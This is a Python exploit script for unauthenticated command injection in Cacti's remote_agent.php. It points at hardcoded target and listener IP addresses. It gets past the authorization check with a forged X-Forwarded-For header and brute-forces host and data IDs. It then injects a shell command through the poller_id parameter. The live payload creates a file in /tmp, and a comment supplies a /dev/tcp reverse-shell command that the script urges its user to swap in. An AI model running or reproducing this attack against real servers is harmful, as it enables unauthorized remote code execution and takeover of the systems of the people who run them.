import requests
import urllib3
import sys
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



#proxies = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}



def main_url():
    print("[*] Sending Requests ...")
    url1 = url+"/remote_agent.php?action=polldata"
    req1 = requests.get(url1,verify=False)
    url2 = url+"/cacti/remote_agent.php?action=polldata"
    req2 = requests.get(url2,verify=False)
    if (req1.status_code == 200):
        return url1
    elif (req2.status_code == 200):
        return url2
    else:
        print("[!] 404 Request => Not Vulnerable :(")
        exit(0)
        
try:
    LHOST = '134.115.161.102'
    LPORT = int('9001')
    url = 'http://34.87.201.62/cacti/' #'http://34.87.201.62/cacti/'
except:
    print(f"You did not use paramters!\nUsage: {sys.argv[0]} URL LHOST LPORT")
    exit(0)

URL = main_url()

main_ip = re.findall(r"^(?:https?:\/\/)?(?:[^@\/\n]+@)?(?:www\.)?([^:\/\n]+)",URL)
ip_domain = str(main_ip[0])


def add_header(url):
    headers_x1 = {"X-Forwarded-For":"127.0.0.1"}
    headers_x2 = {"X-Forwarded-For": ip_domain}
    req_bp1 = requests.get(URL+"&poller_id=1&host_id=1&local_data_ids[]=1",headers=headers_x1,verify=False)
    req_bp2 = requests.get(URL+"&poller_id=1&host_id=1&local_data_ids[]=1",headers=headers_x2,verify=False)
    if (req_bp1.status_code == 200 and req_bp1.text != "FATAL: You are not authorized to use this service"):
        print("[*] Bypassed => Might Be Vulnerable")
        return headers_x1
    elif (req_bp2.status_code == 200 and req_bp2.text != "FATAL: You are not authorized to use this service"):
        print(f"[*] Bypassed => Might Be Vulnerable")
        return headers_x2
    else:
        print("Bypassing Failed => Not Vulnerable !!!")
        exit(0)

HEADER = add_header(URL)
words = ["cpu","cmd.php","polling_time","apache","uptime"]

def finding_id(URL,HEADER):
    print("[*] Brute-Forcing Process Is Running ...")
    last_url = None
    for id in range(1,11):
        for item in range(1,11):
            url_id = URL+f"&poller_id=1&host_id={str(id)}&local_data_ids[]={str(item)}"
            req_id = requests.get(url_id,headers=HEADER,verify=False)
            print(req_id.text)
            if any(x in req_id.text for x in words):
                last_url = URL+f"&host_id={str(id)}&local_data_ids[]={str(item)}&poller_id="
                print("[*] True Ids Founded")
                return last_url
    print("[!] Could Not Find Specific Process")
    exit(0)

l_URL = finding_id(URL,HEADER)


def rev_shell(URL,HEADER):
    print("Connecting To Your Server ...")
    # Change Reverse_Shell Payload From here 
    request = requests.get(URL+f";touch%20%2Ftmp%2Ftcp123",headers=HEADER,verify=False) # sh -i >& /dev/tcp/1.1.1.1/4242 0>&1
    print("IF YOU DIDNT GET CONNECTION BACK, CHANGE THE REVERSE SHELL PAYLOAD !!!")
    if (request.status_code != 200):
        print("[!] Some things wrong with your reverse shell !!!")
        exit(0)
    return 0

rev_shell(l_URL,HEADER)